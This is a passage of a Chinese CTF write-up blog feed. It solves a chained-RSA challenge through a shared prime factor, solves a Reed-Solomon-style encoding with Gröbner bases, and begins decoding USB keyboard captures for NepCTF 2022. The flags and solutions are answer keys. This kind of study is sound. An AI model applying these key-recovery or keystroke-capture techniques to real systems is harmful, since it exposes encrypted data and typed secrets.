class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>gcd测试发现output中的 $n$ 有素公因子 $p$，逆推还原 $m$ 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = [<span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span>,<span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span>,<span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span>,<span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span>,<span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span>,<span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span>,<span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span>,<span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span>,<span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span>,<span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span>,<span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span>,<span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    q = <span class="built_in">int</span>(n[i]//p)</span><br><span class="line">    f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,f)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Solomen’s-puzzle-1"><a href="#Solomen’s-puzzle-1" class="headerlink" title="Solomen’s puzzle 1"></a>Solomen’s puzzle 1</h3><blockquote><p>F1ower做梦梦见了Reed和Solomen，他们告诉了F1ower财富密码，但是F1ower记错了几个字节。。请将最终得到的完整flag(包含DASCTF{})进行MD5后再提交，即提交：<code>&quot;DASCTF&#123;%s&#125;&quot; % md5(flag.encode()).hexdigest()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = F(<span class="number">223</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_block</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(message, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    f = PR([<span class="number">0</span>] * <span class="number">4</span> + message)</span><br><span class="line">    px = f % gx</span><br><span class="line">    mx = f - px</span><br><span class="line">    c = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> mx]</span><br><span class="line">    <span class="keyword">return</span> c + (<span class="number">8</span> - <span class="built_in">len</span>(c)) * [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">byte_stream</span>):</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(byte_stream)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        padding = (length // <span class="number">4</span> + <span class="number">1</span>) * <span class="number">4</span> - length</span><br><span class="line">        byte_stream += padding * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        length += padding</span><br><span class="line">    code = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">4</span>):</span><br><span class="line">        block = byte_stream[i:i+<span class="number">4</span>]</span><br><span class="line">        block_code = encode_block([each <span class="keyword">for</span> each <span class="keyword">in</span> block])</span><br><span class="line">        code += <span class="built_in">bytes</span>(block_code)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591</span></span><br><span class="line"></span><br><span class="line">cipher = bytes_to_long(flag) * e % n</span><br><span class="line">code = encode(long_to_bytes(cipher))</span><br><span class="line"></span><br><span class="line">code = [each <span class="keyword">for</span> each <span class="keyword">in</span> code]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">8</span>):</span><br><span class="line">    index1 = randrange(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    value1 = randrange(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    index2 = randrange(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    value2 = randrange(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">    code[i + index1] = value1</span><br><span class="line">    code[i + index2] = value2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(code))</span><br></pre></td></tr></table></figure></blockquote><p>将 $m$ 通过 $me\%n$ 计算得 $c$，再按4长度分块通过 <code>encode_block()</code> 加密得到密文，每块密文长度为8，前4长度为密文值，后4长度为加密前值，再将后4长度加密前值的一或二位内容随机设置为随机值。</p><p>提取关键加密函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = F(<span class="number">223</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_block</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(message, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">    f = PR([<span class="number">0</span>] * <span class="number">4</span> + message)</span><br><span class="line">    px = f % gx</span><br><span class="line">    mx = f - px</span><br><span class="line">    c = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> mx]</span><br><span class="line">    <span class="keyword">return</span> c + (<span class="number">8</span> - <span class="built_in">len</span>(c)) * [<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>多项式运算 $px=f\%gx$，$mx=f-px$，故 $f$ 与 $mx$ 是一一对应的，可由 $mx$ 恢复原 $f$。</p><p>利用sage多项式计算功能，可以推导 $f$ 与 $mx$ 关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#m = 257</span></span><br><span class="line"><span class="comment">#F = Zmod(m)</span></span><br><span class="line">alpha = <span class="number">223</span></span><br><span class="line">PR.&lt;x,a,b,c,d&gt; = PolynomialRing(Zmod(<span class="number">257</span>))</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">f = d*x^<span class="number">7</span> + c*x^<span class="number">6</span> + b*x^<span class="number">5</span> + a*x^<span class="number">4</span></span><br><span class="line">px = f % gx</span><br><span class="line">mx = f - px</span><br><span class="line"><span class="built_in">print</span>(mx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x^7*d + x^6*c + x^5*b + x^4*a + 145*x^3*a + 233*x^3*b + 82*x^3*c + 73*x^3*d + 184*x^2*a + 200*x^2*b + 141*x^2*c + 111*x^2*d + 152*x*a + 94*x*b + 36*x*c + 126*x*d + 32*a + 243*b + 254*c + 203*d</span></span><br></pre></td></tr></table></figure><p>根据对应关系，利用Gröbner基求解四元模方程组，再分组还原后4长度为加密前值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">m = <span class="number">257</span></span><br><span class="line">F = Zmod(m)</span><br><span class="line">alpha = <span class="number">223</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class="line">gx = (x - alpha ^ <span class="number">0</span>) * (x - alpha ^ <span class="number">1</span>) * (x - alpha ^ <span class="number">2</span>) * (x - alpha ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calLast</span>(<span class="params">v</span>):</span></span><br><span class="line">    P.&lt;a,b,c,d&gt; = PolynomialRing(Zmod(<span class="number">257</span>))</span><br><span class="line">    f0 = <span class="number">32</span>*a + <span class="number">243</span>*b + <span class="number">254</span>*c + <span class="number">203</span>*d - v[<span class="number">0</span>]</span><br><span class="line">    f1 = <span class="number">152</span>*a + <span class="number">94</span>*b + <span class="number">36</span>*c + <span class="number">126</span>*d - v[<span class="number">1</span>]</span><br><span class="line">    f2 = <span class="number">184</span>*a + <span class="number">200</span>*b + <span class="number">141</span>*c + <span class="number">111</span>*d - v[<span class="number">2</span>]</span><br><span class="line">    f3 = <span class="number">145</span>*a + <span class="number">233</span>*b + <span class="number">82</span>*c + <span class="number">73</span>*d - v[<span class="number">3</span>]</span><br><span class="line">    G = Ideal([f0, f1, f2, f3]).groebner_basis()</span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">        mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        m.append(mi)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">e = <span class="number">10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591</span></span><br><span class="line">n = <span class="number">94257413713770111563970534929325680923943690882102478219183863722026590313165304301118258536360712467357451726680293716779730218553691126214750969333228034756948476572806064756873382054384808713137658321644158757777088916851366208046581218865015163572359836440643828462291397248680038931998325006839692797347</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">b&#x27;\xb9$5.&gt;\xff\xe3S\xc91\xb2\xeb\x1byR(\x12&#123;\xc4\xbf\xa4wo|\xc5-;\xc9\xc9S[\xaeX\xad\xf0\xef@\x1c\x87]\x9a\xb9:\x8cu\xa5\xe3EA&lt;&quot;\xfd\x9a\xbfqB\x94\xc3R\x95\xd5\xbd\xd0\x10u\x10\xe3\xa5&quot;S\xed\xd0\xf8\x02\xbf\x124A~1]\xceP\xdf\xf2Cr1\x93\xacw\x03\tQe\xcc2b\xbf\x0f\x92\xad\x19\x00\xab|\xf3\xc9\x9b&amp;I%\xf5\x9b#\xf7\xa2\xcb\xb1\x0c\xee\xb56\xd5\xd2\xd5[?^\x9d\x8b\x93\xbe\x832\xee\xa9\xa5\x83$\xe9\xe5\x95\x01\xd6\x9f\xad\x1f\x90\xc3]aL\x10\x07&#123;#4i^\xae\xdf|\x9f\x94\xf4\xaf\x06R\x86j&amp;\xeb\x0b\x06\xcf\xb2\x8e\xb4\xb9s\x97[\xf1ip\x06\xf8\xfdFs\xf1`\xc6\x82\xd8\xce\xf6\x95&#123;\xe3\x8cQ\xed\xef\xe9\xb9\&#x27;\x19\xdf^\xc8\x81\xde\x1fQ\x1e\x86\xda\xf8\xfd4M0#\xef\x8a\xe9\xe5\xfc\xe2\xe3\xe6\xd0e\xce\xe1\x0b\x9eM\x07\xc2Y\xf8B\xe1\xde\xfaP\xe9\x9d\xde\xc3\xe3C\xa5&#x27;</span>)</span><br><span class="line">ori_c = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">8</span>):</span><br><span class="line">    block = c[i:i+<span class="number">8</span>]</span><br><span class="line">    ori_c += calLast(c[i:i+<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">bytes</span>(ori_c).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">bytes</span>(ori_c).<span class="built_in">hex</span>(),<span class="number">16</span>)*inverse_mod(e,n)%n</span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DASCTF&#123;%s&#125;&quot;</span> % md5(flag).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;4e4fc02d88b0c8f66c924489e1bf58ea&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2022</title>
    <link href="https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/"/>
    <id>https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/</id>
    <published>2022-07-17T13:18:30.000Z</published>
    <updated>2022-07-17T16:14:32.991Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。</p><p>比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。</p><p>比赛形式：个人解题赛</p><p>比赛链接：<a href="http://nep.lemonprefect.cn/">http://nep.lemonprefect.cn/</a></p><p>比赛平台：Power by CTFm</p><p>NepCTF 2022赛事说明文档：<a href="https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj">https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj</a></p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>极限套娃</p><p>flag格式为nepctf{}</p></blockquote><p>jpg中提取出zip压缩包，zip压缩包套娃232层，用cyberchef label+jump循环提取出最内层的pcap文件；</p><p>wireshark打开发现为USB键盘流量，tshark工具提取出usb.capdata数据，用脚本还原键位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span 